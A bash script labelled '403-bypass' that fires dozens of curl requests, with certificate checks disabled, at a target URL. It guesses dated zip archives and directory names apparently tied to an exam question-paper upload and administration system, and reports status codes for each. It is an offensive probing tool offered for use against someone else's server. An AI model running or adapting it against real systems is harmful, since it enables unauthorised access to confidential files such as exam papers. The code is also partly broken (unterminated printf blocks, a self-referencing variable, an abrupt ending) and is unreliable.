#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 echo -n "Payload ["QPBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QP/"" -H "User-Agent: Mozilla/5.0")
